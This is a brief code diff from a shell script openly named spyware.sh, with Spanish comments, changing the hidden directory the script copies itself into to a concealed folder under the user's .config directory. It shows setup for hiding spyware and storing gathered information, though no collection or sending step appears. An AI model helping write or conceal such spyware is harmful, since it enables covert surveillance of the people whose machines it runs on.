@@ -4,7 +4,7 @@
 SPYWARE_NAME="spyware.sh"
 
 # Ruta oculta a donde se copiará
-HIDDEN_DIR="/config/.oculto"
+HIDDEN_DIR="$HOME/.config/.oculto"
 HIDDEN_PATH="$HIDDEN_DIR/$SPYWARE_NAME"
 
 # Archivo donde se guardará la información
